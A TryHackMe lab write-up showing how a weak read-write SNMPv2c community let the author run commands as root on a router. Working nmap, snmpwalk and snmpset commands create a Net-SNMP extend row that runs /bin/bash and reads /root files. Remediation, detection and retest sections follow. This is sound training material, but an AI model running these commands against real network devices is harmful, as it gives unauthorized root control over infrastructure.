---
title: "TryHackMe: Operation Takeover"
date: 2026-08-01 23:01:45 +0200
categories: [TryHackMe]
tags:
  - linux
  - snmp
  - snmpv2c
  - net-snmp
  - router
  - network-security
  - remote-code-execution
description: >-
  A weak read-write SNMPv2c community enabled Net-SNMP extend abuse
  and remote root command execution on a network router.
author: lenovolegion7
media_subpath: /images/tryhackme_operation_takeover
image:
  path: room_image.webp
  alt: "Original TryHackMe Operation Takeover room artwork"
toc: true
comments: false
---

**Operation Takeover** was a medium-difficulty network-device challenge focused on compromising a router through its management plane. The validated path began with TCP and UDP service discovery, continued through identification of a weak read-write SNMPv2c community, and ended with root-level command execution through the Net-SNMP extend table. The temporary extend entry was removed after the objective was validated.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Operation Takeover room card](room_card.webp){: w="303" h="272" .shadow }](https://tryhackme.com/room/operationtakeover)

## Initial Enumeration

Full TCP and targeted UDP scans were used to map the exposed services.

```console
$ nmap -Pn -p- --min-rate 2000 -T4 TARGET_IP
$ nmap -Pn -sU --top-ports 200 --min-rate 500 -T4 TARGET_IP
```

The router exposed several management-plane services:

```text
PORT      PROTOCOL  SERVICE          OBSERVED DETAIL
22        TCP       SSH              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
179       TCP       BGP              TCP wrapped; BGP service reachable
2623      TCP       FRRouting VTY    FRRouting 10.0 password-only console
161       UDP       SNMP             Net-SNMP with community-based access
```

The SSH, BGP, and FRRouting services expanded the attack surface, but they were not required for the validated compromise. The FRRouting VTY password was not recovered.

## Validated Attack Path

1. **Service discovery** — TCP and UDP enumeration exposed SSH, BGP, an FRRouting VTY console, and Net-SNMP on UDP/161.
2. **Community discovery** — Common SNMP communities failed, but a targeted dictionary attack identified a weak community string, redacted here as `[REDACTED]`. The exact brute-force transcript was not retained, so no unsupported discovery command is reproduced.
3. **Write-access validation** — SNMP enumeration disclosed host and network information, and `snmp-check` confirmed that the community accepted write operations.
4. **Net-SNMP extend abuse** — A temporary extend row was created with numeric OIDs, instructing `snmpd` to execute `/bin/bash` and return the command output through SNMP.
5. **Objective validation and cleanup** — The returned output showed `uid=0(root)` and disclosed the flag in `/root/flag.txt`. The temporary extend row was then destroyed with `RowStatus` value `6`.

> **Result:** A network attacker able to reach UDP/161 and recover the weak read-write community could execute commands as root without valid operating-system or FRRouting credentials.
{: .prompt-danger }

## SNMP Enumeration and Write Validation

The recovered community provided SNMPv2c access to system information. Enumeration exposed the Linux kernel, hostname, contact data, interfaces, routes, processes, storage information, and installed software.

```console
$ snmpwalk -v2c -c '[REDACTED]' TARGET_IP 1.3.6.1.2.1.1
$ snmp-check TARGET_IP -p 161 -c '[REDACTED]' -w
```

Relevant evidence was reduced to the lines needed to demonstrate the security impact:

```text
iso.3.6.1.2.1.1.1.0 = STRING: "Linux e42ceec45c86 5.15.0-1075-aws ... x86_64"
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost>"
iso.3.6.1.2.1.1.5.0 = STRING: "e42ceec45c86"

snmp-check: [*] Write access permitted!
```

This was more than information disclosure. A writable SNMP principal could alter objects exposed to its view, including the Net-SNMP extend configuration subtree.

## Root Command Execution Through Net-SNMP Extend

An initial `snmp-shell` attempt failed on the tester workstation because symbolic MIB names such as `nsExtendStatus` could not be resolved. This was a local tooling dependency issue, not evidence of target-side protection. Using numeric OIDs removed the missing-MIB dependency.

The extend token `evilcommand` was encoded as an SNMP table index: a length value of `11` followed by the decimal ASCII values of the token. The required extend-table objects were then defined directly:

```console
$ IDX='11.101.118.105.108.99.111.109.109.97.110.100'
$ STATUS='.1.3.6.1.4.1.8072.1.3.2.2.1.21.'$IDX
$ COMMAND='.1.3.6.1.4.1.8072.1.3.2.2.1.2.'$IDX
$ ARGS='.1.3.6.1.4.1.8072.1.3.2.2.1.3.'$IDX
$ OUTPUT='.1.3.6.1.4.1.8072.1.3.2.3.1.2.'$IDX
```

The row configured `/bin/bash` as the executable and used `RowStatus` value `4` to create and activate it:

```console
$ MIBS=: snmpset -v2c -c '[REDACTED]' TARGET_IP \
    "$COMMAND" s '/bin/bash' \
    "$ARGS" s '-c "id; hostname; ls -la /root; cat /root/* 2>/dev/null"' \
    "$STATUS" i 4
```

The command output was then retrieved from the extend output table:

```console
$ MIBS=: snmpget -v2c -c '[REDACTED]' -Oqv TARGET_IP "$OUTPUT"
uid=0(root) gid=0(root) groups=0(root)
e42ceec45c86
...
-rw-r--r-- 1 root root 28 May 27 2024 flag.txt
THM{[REDACTED]}
```

Because `snmpd` executed the configured command as root, possession of the read-write community was effectively equivalent to remote root command execution without valid operating-system credentials.

## Findings Summary

| ID | Severity | Finding | CVSS | Status |
|---|---|---|---:|---|
| F-01 | Critical | Remote root command execution through weak SNMP read-write access and Net-SNMP extend | 9.8 | Confirmed |
| F-02 | Medium | Excessive SNMP information disclosure to a community-based principal | 5.3 | Confirmed |
| F-03 | Informational | Additional router management services exposed but not used in the validated compromise | N/A | Observed |

## Security Impact

The demonstrated primitive provided unrestricted command execution in the root security context. Although the validation command only enumerated `/root` and read the objective file, the same access could have been used to alter routes, firewall policy, user accounts, startup scripts, authentication controls, operating-system files, or the SNMP configuration itself.

The resulting risk affected all three core security properties:

- **Confidentiality:** root-readable configuration, credentials, logs, and other sensitive files could be disclosed.
- **Integrity:** routing, forwarding, firewall, service, and authentication behavior could be modified.
- **Availability:** routing or management services could be stopped or the device could be made unavailable.

Compromise of a router also weakens network trust because traffic could potentially be intercepted, redirected, or used to support lateral movement into downstream systems.

## Remediation

The following actions were recommended by the assessment:

1. Remove or disable the compromised community immediately and rotate SNMP communities across the environment.
2. Disable SNMPv1 and SNMPv2c, then migrate monitoring to SNMPv3 with authentication and privacy (`authPriv`) using unique per-device credentials.
3. Grant routine monitoring principals read-only access to the smallest required MIB view. Do not provide write access without a documented requirement and strict source validation.
4. Explicitly deny remote access to `NET-SNMP-EXTEND-MIB`, command-execution objects, `pass`/`persist` extensions, and other sensitive configuration subtrees.
5. Restrict UDP/161 with host firewalls and upstream ACLs so that only dedicated monitoring systems or management jump hosts can reach it.
6. Run `snmpd` with the lowest feasible privileges and isolate it from sensitive paths and executables.
7. Alert on SNMP `SET` requests, changes beneath `1.3.6.1.4.1.8072.1.3`, unexpected extend tokens, and extend-output retrieval.
8. Restrict SSH, BGP, and FRRouting VTY services to a dedicated management plane, and disable unnecessary password-only consoles.

## Cleanup

After proof collection, the temporary `evilcommand` row was deleted by setting its `RowStatus` to `6`:

```console
$ MIBS=: snmpset -v2c -c '[REDACTED]' TARGET_IP "$STATUS" i 6
...1.21.11.101.118.105.108.99.111.109.109.97.110.100 = INTEGER: 6
```

The SET response returned `RowStatus` value `6`, showing that the destroy request was accepted. No files, accounts, startup entries, persistent services, BGP configuration, FRRouting configuration, firewall rules, or interface settings were added or changed. The weak community remained configured and required owner remediation.

## Retest Guidance

A focused retest should verify that unauthorized sources cannot reach UDP/161, that the previous and common community strings fail, and that approved SNMPv3 users receive only the intended read-only view. Attempts to write benign objects or create Net-SNMP extend rows should be rejected and should generate security telemetry. SSH, BGP, and FRRouting VTY exposure should also be rescanned from unauthorized network segments.

## Lessons Learned

- A weak SNMPv2c community is particularly dangerous when it has write permissions; access can become full code execution when command-capable MIB objects are writable.
- Numeric OIDs are a reliable alternative when a tester workstation lacks the symbolic MIB definitions needed by higher-level tooling.
- Management-plane segmentation and source ACLs are essential controls for routers and other infrastructure devices.
- Temporary configuration created during validation must be explicitly removed and verified during cleanup.
